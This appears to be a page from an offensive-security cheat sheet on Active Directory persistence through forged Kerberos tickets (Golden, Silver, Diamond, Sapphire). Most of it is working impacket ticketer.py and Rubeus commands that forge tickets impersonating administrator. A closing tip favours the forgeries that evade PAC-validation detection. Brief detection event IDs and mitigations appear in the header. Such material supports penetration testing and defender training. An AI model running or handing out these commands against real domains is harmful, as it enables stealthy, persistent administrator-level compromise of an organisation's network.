---
title: Golden / Silver / Diamond / Sapphire tickets
category: AD / Persistence
order: 10
tags: [golden, silver, diamond, sapphire, krbtgt, ticketer, forgery]
summary: >
  Forged Kerberos tickets. Golden = full TGTs from the krbtgt key. Silver =
  service tickets from a service account key (offline, no DC contact). Diamond &
  Sapphire = forgeries that blend in by riding real tickets/PACs.
prerequisites:
  - Golden: the krbtgt NT or AES key + the domain SID
  - Silver: the target service account's key (computer$ for CIFS/HOST) + domain SID
  - Diamond/Sapphire: krbtgt key (diamond) or valid creds + a privileged user to impersonate (sapphire)
tools: [impacket (ticketer), Rubeus, mimikatz]
detection:
  - Golden: 4769 without a preceding 4768; odd TGT lifetimes; unknown accounts
  - Silver: 4624 on the service host with no 4768/4769 on the DC
mitigation:
  - Rotate krbtgt TWICE if compromised; gMSA for services; monitor ticket anomalies; Protected Users
refs:
  - { label: "The Hacker Recipes — forged tickets", url: "https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets" }
  - { label: "adsecurity — golden ticket", url: "https://adsecurity.org/?p=1640" }
---

## Golden (krbtgt → any TGT)

```sh
ticketer.py -nthash <krbtgt_nt> -domain-sid $domain_sid -domain $domain administrator
# or with the AES key (stealthier)
ticketer.py -aesKey <krbtgt_aes> -domain-sid $domain_sid -domain $domain administrator
export KRB5CCNAME=administrator.ccache
```

## Silver (service key → TGS, no DC contact)

```sh
# forge a CIFS ticket to a host using its machine-account key
ticketer.py -nthash <machine_nt> -domain-sid $domain_sid -domain $domain \
  -spn cifs/$target administrator
```

## Diamond & Sapphire (blend in)

```sh
# Sapphire: request a real TGT, then embed a privileged user's PAC via S4U/U2U
ticketer.py -request -impersonate administrator -domain $domain \
  -domain-sid $domain_sid -user $user -password $password -aesKey <krbtgt_aes> administrator
```

```powershell
# Diamond (Rubeus): decrypt a real TGT and re-sign it with the krbtgt key
Rubeus.exe diamond /krbkey:<krbtgt_aes> /user:$user /password:$password /ticketuser:administrator /ptt
```

> **Golden** is powerful but the most detectable (fabricated PAC). **Diamond**
> and **Sapphire** copy a legitimate PAC, so they survive PAC-validation checks —
> prefer them where detection matters. Silver never touches the DC at all.
